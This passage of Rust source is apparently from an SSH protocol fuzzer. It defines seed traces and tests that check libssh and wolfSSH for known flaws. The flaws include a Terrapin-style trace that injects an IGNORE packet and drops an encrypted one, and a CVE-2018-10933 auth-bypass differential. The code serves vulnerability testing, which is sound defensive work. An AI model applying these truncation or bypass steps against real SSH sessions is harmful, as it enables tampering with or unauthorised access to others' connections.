            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }), // ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }), // ECDH_REPLY+NEWKEYS
            // (a) INSERT a cleartext IGNORE into c2s before the client's NEWKEYS:
            // bumps the server's c2s receive sequence number by 1.
            InputAction::new_step(server, term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) }),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }), // client NEWKEYS
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            // (b) Forward the client's encrypted c2s packets individually, DROPPING
            // the first (OnWire 0). With the +1 from the IGNORE, the server's
            // counter realigns on OnWire 1, so tags still verify.
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/OnWireData }),
            InputAction::new_step(client, term! { (server, 5)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Packet-granular two-honest-party relay: forwards **one message per step**
/// (cleartext as `RawSshMessage`, encrypted as byte-faithful `OnWireData`)
/// instead of whole flights. This makes every packet — including each
/// post-NEWKEYS encrypted packet — an individually droppable/reorderable step,
/// the representation a prefix-truncation attack (Terrapin) needs (the
/// flight-granular relay could only drop whole flights).
///
/// STATUS: WIP. The cleartext handshake and the first encrypted exchange
/// (SERVICE_REQUEST / SERVICE_ACCEPT) relay correctly packet-by-packet, proving
/// individual encrypted packets are forwardable. But the handshake does NOT
/// complete: forcing one-message-per-step desynchronises libssh's reactive
/// output *batching* (the real client stops emitting USERAUTH_REQUEST after
/// SERVICE_ACCEPT, regardless of progress pumping), whereas the flight-granular
/// relay completes precisely because it preserves that batching. Finding: even
/// with packet-granularity, driving two real PUTs to completion one packet at a
/// time fights the libraries' I/O batching — which further explains why the
/// fuzzer is unlikely to *maintain* a completing handshake while mutating toward
/// Terrapin. Not in the corpus until it completes.
pub fn seed_handshake_two_party_packet(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig { typ: AgentType::Client, try_reuse: false },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig { typ: AgentType::Server, try_reuse: false },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, one packet per step.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // KEX_ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // KEX_ECDH_REPLY
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS
            // Encrypted phase: forward each post-NEWKEYS packet as raw OnWireData
            // (byte-faithful; RawSshMessage can't represent ciphertext). OnWireData
            // is indexed per encrypted packet (0-based), and each is an
            // individually droppable step — the representation Terrapin needs.
            // Empty output reads don't add knowledge, so pump liberally.
            OutputAction::new_step(client),
            OutputAction::new_step(client), // SERVICE_REQUEST (client OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // SERVICE_ACCEPT (server OnWire 0)
            InputAction::new_step(client, term! { (server, 0)/OnWireData }),
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // USERAUTH_REQUEST (client OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // USERAUTH_SUCCESS (server OnWire 1)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }),
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// AES-256-GCM counterpart of [`server_decryption_recipes`], for the AES-GCM
/// flow (mirrors `seed_client_attacker_full_aesgcm`). Decrypts the server's
/// first three post-NewKeys s2c packets. The GCM invocation counter restarts at
/// 0 at NewKeys, so it matches the per-direction packet index directly (no
/// strict/non-strict ambiguity as in the ChaCha20 case).
pub fn server_decryption_recipes_aesgcm(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // The client KexInit is the fixed AES-GCM offer, so I_C is reconstructible
    // without consulting any PUT knowledge.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let mk = |idx_term: Term<SshProtocolTypes>, counter: Term<SshProtocolTypes>| {
        let key = key.clone();
        let iv = iv.clone();
        term! { fn_decrypt_packet_aesgcm((@idx_term), (@key), (@iv), (@counter)) }
    };

    vec![
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
    ]
}

pub fn create_corpus(
    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
    let client = AgentName::first();
    let server = client.next();

    // Only seeds that complete a full handshake are kept (the legacy mutual /
    // pre-crypto stub seeds were pruned). The chacha20 *_full seeds complete on
    // libssh; the *_aesgcm seeds complete on BOTH libssh and wolfSSH.
    vec![
        (
            seed_client_attacker_full(server),
            "seed_client_attacker_full",
        ),
        (
            seed_server_attacker_full(client),
            "seed_server_attacker_full",
        ),
        (
            seed_client_attacker_full_aesgcm(server),
            "seed_client_attacker_full_aesgcm",
        ),
        (
            seed_server_attacker_full_aesgcm(client),
            "seed_server_attacker_full_aesgcm",
        ),
        // Publickey login as key A — the baseline for the entity-authentication
        // / impersonation oracle. Mutations that make the server authenticate a
        // different key are flagged as impersonation. The chacha20 variant is
        // libssh-only; the aesgcm variant completes on both libssh and wolfSSH.
        (
            seed_client_attacker_pubkey(server),
            "seed_client_attacker_pubkey",
        ),
        (
            seed_client_attacker_pubkey_aesgcm(server),
            "seed_client_attacker_pubkey_aesgcm",
        ),
        // Two real PUTs relayed by the attacker — the substrate the live
        // matching-conversation oracle needs. Mutations that desync the relayed
        // transcript (Terrapin-style) are flagged as a security objective.
        (
            seed_handshake_two_party(client, server),
            "seed_handshake_two_party",
        ),
    ]
}

#[cfg(test)]
mod tests {
    use puffin::execution::{Runner, TraceRunner};
    use puffin::trace::Spawner;

    use crate::ssh::seeds::{seed_client_attacker_full, seed_server_attacker_full};
    use crate::ssh_registry;

    #[test]
    fn attacker_key_fingerprint_matches_constant() {
        use sha2::{Digest, Sha256};

        use crate::claim::ATTACKER_PUBKEY_SHA256;
        use crate::ssh::fn_impl::fn_client_a_pubkey_blob;
        let blob = fn_client_a_pubkey_blob().unwrap();
        let fp = Sha256::digest(&blob.0);
        assert_eq!(
            fp.as_slice(),
            ATTACKER_PUBKEY_SHA256.as_slice(),
            "ATTACKER_PUBKEY_SHA256 is out of sync with key A's public key"
        );
    }

    /// End-to-end: the honest publickey login as A completes against the real
    /// libssh server, and the entity-authentication oracle is clean (A is the
    /// key the attacker legitimately controls — no impersonation).
    #[test_log::test]
    fn test_seed_client_attacker_pubkey() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::{SshClaimInner, ATTACKER_PUBKEY_SHA256};
        use crate::ssh::seeds::seed_client_attacker_pubkey;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let context = runner
            .execute(seed_client_attacker_pubkey(server), &mut 0)
            .unwrap();

        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE via publickey auth"
        );

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("server emitted no claim");
        let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
        assert_eq!(inner.auth_method, "publickey", "expected publickey auth");
        assert_eq!(
            inner.auth_key_fingerprint.as_slice(),
            ATTACKER_PUBKEY_SHA256.as_slice(),
            "server authenticated a key other than A"
        );
    }

    /// CVE-2018-10933 positive demonstration: the auth-bypass seed must trip the
    /// entity-authentication oracle on vulnerable libssh 0.8.3, and must NOT on
    /// the patched 0.10.4 / 0.11.4 — the property (not a coded mechanism)
    /// distinguishes them.
    #[test_log::test]
    fn test_cve_2018_10933_auth_bypass_differential() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_client_attacker_auth_bypass;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();
        let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();

        let mut saw_vulnerable = false;
        for put in puts {
            if !put.starts_with("libssh") {
                continue;
            }
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new(put.clone(), PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let result = runner.execute(seed_client_attacker_auth_bypass(server), &mut 0);
            let fired =
                matches!(&result, Err(e) if format!("{e}").contains("authentication bypass"));

            if put.contains("0803") {
                assert!(
                    fired,
                    "{put} (vulnerable) should trip the auth-bypass oracle"
                );
                saw_vulnerable = true;
            } else {
                assert!(!fired, "{put} (patched) must NOT report an auth bypass");
            }
        }
        assert!(
            saw_vulnerable,
            "vulnerable libssh0803 PUT not present — build it first"
        );
    }

    /// Trace-analysis matching conversation: recover, by re-evaluating the
    /// trace's input recipes, what each honest party received on the wire — and
    /// show that dropping a relayed message (the Terrapin truncation primitive)
    /// changes the delivered transcript. No PUT introspection, mechanism-blind.
    #[test_log::test]
    fn test_delivered_transcript_detects_dropped_message() {
        use puffin::trace::Action;

        use crate::ssh::seeds::seed_handshake_two_party;
        use crate::violation::delivered_to;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();

        // Honest relay: recover both parties' received transcripts.
        let honest = seed_handshake_two_party(client, server);
        let runner = Runner::new(registry.clone(), Spawner::new(registry.clone()));
        let ctx = runner.execute(honest.clone(), &mut 0).unwrap();
        let server_rx_honest = delivered_to(&honest, &ctx, server);
        let client_rx_honest = delivered_to(&honest, &ctx, client);
        assert!(
            !server_rx_honest.is_empty(),
            "no transcript delivered to server"
        );
        assert!(
            !client_rx_honest.is_empty(),
            "no transcript delivered to client"
        );

        // Tampered relay: the attacker drops the last c2s forward. The delivered
        // transcript to the server must shrink — the manipulation is visible
        // purely from the trace.
        let mut tampered = honest.clone();
        let drop_idx = tampered
            .steps
            .iter()
            .rposition(|s| s.agent == server && matches!(s.action, Action::Input(_)))
            .expect("no server input step to drop");
        tampered.steps.remove(drop_idx);

        // Evaluate the tampered trace's deliveries against the (honest) context;
        // the dropped forward simply isn't delivered, so the transcript shrinks.
        let server_rx_tampered = delivered_to(&tampered, &ctx, server);
        assert!(
            server_rx_tampered.len() < server_rx_honest.len(),
            "dropping a relayed message should shrink the server's received transcript \
             (honest {} vs tampered {})",
            server_rx_honest.len(),
            server_rx_tampered.len()
        );
    }

    /// Terrapin precondition differential, by construction: the injected
    /// cleartext `IGNORE` during KEX is **rejected by strict-kex (libssh 0.11.4)**
    /// and **accepted by non-strict (libssh 0.10.4)**. This is exactly the
    /// enabling condition for a Terrapin prefix truncation — present on the
    /// vulnerable version, mitigated on the patched one. (A fully tag-preserving
    /// truncation that completes and trips the matching-conversation oracle needs
    /// exact sequence-number realignment — separate, deeper work.)
    #[test_log::test]
    fn test_terrapin_ignore_rejected_under_strict_kex() {
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::ssh::seeds::seed_terrapin_attempt;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();

        let run = |put: &str| -> String {
            let spawner = Spawner::new(registry.clone()).with_mapping(&[
                (client, PutDescriptor::new(put, PutOptions::default())),
                (server, PutDescriptor::new(put, PutOptions::default())),
            ]);
            match Runner::new(registry.clone(), spawner)
                .execute(seed_terrapin_attempt(client, server), &mut 0)
            {
                Ok(_) => String::new(),
                Err(e) => format!("{e}"),
            }
        };

        if registry.find_by_id("libssh0114-asan").is_some() {
            let e = run("libssh0114-asan");
            assert!(
                e.to_lowercase().contains("strict kex"),
                "0.11.4 should reject the injected IGNORE under strict kex; got: {e:?}"
            );
        }
        if registry.find_by_id("libssh0104-asan").is_some() {
            let e = run("libssh0104-asan");
            assert!(
                !e.to_lowercase().contains("strict kex"),
                "0.10.4 (no strict kex) must NOT reject the IGNORE as a strict-kex \
                 violation; got: {e:?}"
            );
        }
    }

    /// Packet-granular relay (WIP): the cleartext handshake + first encrypted
    /// exchange relay one packet at a time (proving individual encrypted packets
    /// are forwardable), but the handshake doesn't yet complete due to libssh I/O
    /// batching — see the function doc. Asserted as "reaches the encrypted phase"
    /// so this stays a regression guard for the packet-granular capability.
    #[test_log::test]
    fn test_packet_relay_reaches_encrypted_phase() {
        use crate::ssh::seeds::seed_handshake_two_party_packet;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        // It currently errors when it runs out of one-packet-at-a-time auth
        // messages; that it gets that far means cleartext + first encrypted
        // exchange relayed individually (the packet-granular capability works).
        let res = Runner::new(registry.clone(), Spawner::new(registry.clone()))
            .execute(seed_handshake_two_party_packet(client, server), &mut 0);
        // Either it completes (future work) or fails reaching a later encrypted
        // packet — never earlier than the first encrypted exchange.
        if let Err(e) = res {
            let msg = format!("{e}");
            assert!(
                msg.contains("OnWireData"),
                "packet relay broke before the encrypted phase: {msg}"
            );
        }
    }

    /// The live matching-conversation oracle: a faithful relay agrees (no
    /// violation), but dropping a *mid-stream* relayed message (the Terrapin
    /// truncation primitive) breaks the transcript prefix relation and is
    /// flagged. Exercises `matching_conversation_violation` — the function the
    /// trace-aware security hook runs.
    #[test_log::test]
    fn test_matching_conversation_oracle() {
        use puffin::trace::Action;

        use crate::ssh::seeds::seed_handshake_two_party;
        use crate::violation::matching_conversation_violation;

        let registry = ssh_registry();
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let honest = seed_handshake_two_party(client, server);
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let ctx = runner.execute(honest.clone(), &mut 0).unwrap();

        // Faithful relay: the two views agree.
        assert_eq!(matching_conversation_violation(&honest, &ctx), None);

        // Drop a MID-STREAM client->server forward (not the in-flight tail): the
        // server's received transcript diverges from what the client sent.
        let server_inputs: Vec<usize> = honest
            .steps
            .iter()
            .enumerate()
            .filter(|(_, s)| s.agent == server && matches!(s.action, Action::Input(_)))
            .map(|(i, _)| i)
            .collect();
        let mut tampered = honest.clone();
        tampered.steps.remove(server_inputs[server_inputs.len() / 2]);

        assert!(
            matching_conversation_violation(&tampered, &ctx).is_some(),
            "dropping a mid-stream relayed message must trip the matching-conversation oracle"
        );
    }

    /// Cross-vendor: the AES-GCM publickey login as A completes against BOTH
    /// libssh and wolfSSH, the server records A's fingerprint, and the
    /// entity-authentication oracle is clean on both (no impersonation).
    #[test_log::test]
    fn test_seed_client_attacker_pubkey_aesgcm_both_puts() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::{SshClaimInner, ATTACKER_PUBKEY_SHA256};
        use crate::ssh::seeds::seed_client_attacker_pubkey_aesgcm;

        let registry = ssh_registry();
        let server = puffin::agent::AgentName::first();

        // Run on every PUT that completes the AES-GCM handshake (modern libssh +
        // wolfSSH). libssh 0.8.x predates aes256-gcm@openssh.com, so skip it.
        let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();
        for put in puts {
            if put.contains("0803") {
                continue;
            }
            let spawner = Spawner::new(registry.clone()).with_mapping(&[(
                server,
                PutDescriptor::new(put.clone(), PutOptions::default()),
            )]);
            let runner = Runner::new(registry.clone(), spawner);
            let context = runner
                .execute(seed_client_attacker_pubkey_aesgcm(server), &mut 0)
                .unwrap_or_else(|e| panic!("pubkey-aesgcm failed on {put}: {e}"));

            assert!(
                context.find_agent(server).unwrap().is_state_successful(),
                "{put}: server did not reach DONE via publickey auth"
            );
            let claim = context
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .unwrap_or_else(|| panic!("{put}: no claim"));
            let inner = claim.as_any().downcast_ref::<Box<SshClaimInner>>().unwrap();
            assert_eq!(
                inner.auth_method, "publickey",
                "{put}: expected publickey auth"
            );
            assert_eq!(
                inner.auth_key_fingerprint.as_slice(),
                ATTACKER_PUBKEY_SHA256.as_slice(),
                "{put}: server authenticated a key other than A"
            );
        }
    }

    #[test_log::test]
    fn test_seed_client_attacker_full() {
        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full(server);
        let result = runner.execute(trace, &mut 0);
        // The trace must execute without hard errors
        let context = result.unwrap();
        // The server should have processed auth and be in DONE state
        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE state"
        );
    }

    #[test_log::test]
    fn test_seed_server_attacker_full() {
        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let client = puffin::agent::AgentName::first();
        let trace = seed_server_attacker_full(client);
        let context = runner.execute(trace, &mut 0).unwrap();
        // The client should have completed authentication
        assert!(
            context.find_agent(client).unwrap().is_state_successful(),
            "client did not reach DONE state"
        );
    }

    /// End-to-end check that the libssh harness emits a HandshakeComplete claim
    /// once the transport handshake finishes, and that it travels through the
    /// notify trampoline into the global claim list with sane negotiated values.
    #[test_log::test]
    fn test_handshake_claim_emitted() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::SshClaimInner;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("server emitted no HandshakeComplete claim");

        // `Claim::inner` boxes a `Box<SshClaimInner>`, so that is the concrete
        // type behind the trait object.
        let inner = claim
            .as_any()
            .downcast_ref::<Box<SshClaimInner>>()
            .expect("claim inner was not an SshClaimInner");

        assert!(inner.is_server, "server claim should have is_server = true");
        assert!(
            inner.kex.contains("curve25519"),
            "unexpected negotiated kex: {:?}",
            inner.kex
        );
        assert!(
            !inner.cipher_in.is_empty() && !inner.cipher_out.is_empty(),
            "negotiated ciphers should be populated: in={:?} out={:?}",
            inner.cipher_in,
            inner.cipher_out
        );
    }

    /// Diagnostic: drive two real libssh PUTs through a handshake purely by DY
    /// relay, and report how far each gets. This validates the two-honest-party
    /// trace shape needed for the matching-conversation property.
    #[test_log::test]
    fn test_handshake_two_party() {
        use puffin::algebra::dynamic_function::TypeShape;

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_handshake_two_party;

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let client = puffin::agent::AgentName::first();
        let server = client.next();
        let trace = seed_handshake_two_party(client, server);

        let context = runner.execute(trace, &mut 0).unwrap();

        // Both honest endpoints must complete the handshake by pure relay.
        assert!(
            context.find_agent(client).unwrap().is_state_successful(),
            "client did not reach DONE"
        );
        assert!(
            context.find_agent(server).unwrap().is_state_successful(),
            "server did not reach DONE"
        );

        // Both endpoints must emit a HandshakeComplete claim — the two honest
        // views the matching-conversation oracle compares.
        assert!(
            context
                .find_claim(client, TypeShape::of::<SshClaimInner>())
                .is_some(),
            "client emitted no claim"
        );
        assert!(
            context
                .find_claim(server, TypeShape::of::<SshClaimInner>())
                .is_some(),
            "server emitted no claim"
        );

        // On the benign relay the two views must agree: the matching-conversation
        // oracle reports no violation.
        assert!(
            context.verify_security_violations().is_ok(),
            "matching-conversation oracle fired on a benign honest relay (false positive)"
        );
    }

    /// The AES-GCM s2c decryption recipes must actually decrypt the libssh
    /// server's post-NewKeys output, otherwise they contribute nothing to the
    /// encrypted-layer differential.
    #[test_log::test]
    fn test_aesgcm_decryption_recipes_decrypt() {
        use puffin::algebra::TermType;

        use crate::ssh::seeds::{
            seed_client_attacker_full_aesgcm, server_decryption_recipes_aesgcm,
        };

        let registry = ssh_registry();
        let runner = Runner::new(registry.clone(), Spawner::new(registry));
        let server = puffin::agent::AgentName::first();
        let trace = seed_client_attacker_full_aesgcm(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let decrypted = server_decryption_recipes_aesgcm(server)
            .iter()
            .filter(|t| t.evaluate_dy(&context).is_ok())
            .count();
        assert!(
            decrypted >= 1,
            "no AES-GCM s2c packet decrypted; recipes are dead"
        );
    }

    /// Same end-to-end claim check, but driving the wolfSSH PUT (if compiled in)
    /// over the AES-GCM seed, proving the claimer is wired for the second vendor.
    #[test_log::test]
    fn test_handshake_claim_emitted_wolfssh() {
        use puffin::algebra::dynamic_function::TypeShape;
        use puffin::put::{PutDescriptor, PutOptions};

        use crate::claim::SshClaimInner;
        use crate::ssh::seeds::seed_client_attacker_full_aesgcm;

        let registry = ssh_registry();

        // Discover the wolfSSH PUT by name; skip if this build has none.
        let Some(wolfssh_put) = registry
            .puts()
            .map(|(name, _)| name.to_owned())
            .find(|name| name.contains("wolfssh"))
        else {
            eprintln!("no wolfSSH PUT compiled in; skipping");
            return;
        };

        let server = puffin::agent::AgentName::first();
        let spawner = Spawner::new(registry.clone()).with_mapping(&[(
            server,
            PutDescriptor::new(wolfssh_put, PutOptions::default()),
        )]);
        let runner = Runner::new(registry, spawner);
        let trace = seed_client_attacker_full_aesgcm(server);
        let context = runner.execute(trace, &mut 0).unwrap();

        let claim = context
            .find_claim(server, TypeShape::of::<SshClaimInner>())
            .expect("wolfSSH server emitted no HandshakeComplete claim");
        let inner = claim
            .as_any()
            .downcast_ref::<Box<SshClaimInner>>()
            .expect("claim inner was not an SshClaimInner");

        assert!(inner.is_server, "server claim should have is_server = true");
        assert!(
            !inner.kex.is_empty() && inner.kex != "none",
            "wolfSSH negotiated kex should be populated: {:?}",
            inner.kex
        );
        assert!(
            !inner.cipher_in.is_empty() && !inner.cipher_out.is_empty(),
            "wolfSSH negotiated ciphers should be populated: in={:?} out={:?}",
            inner.cipher_in,
            inner.cipher_out
        );
    }
}
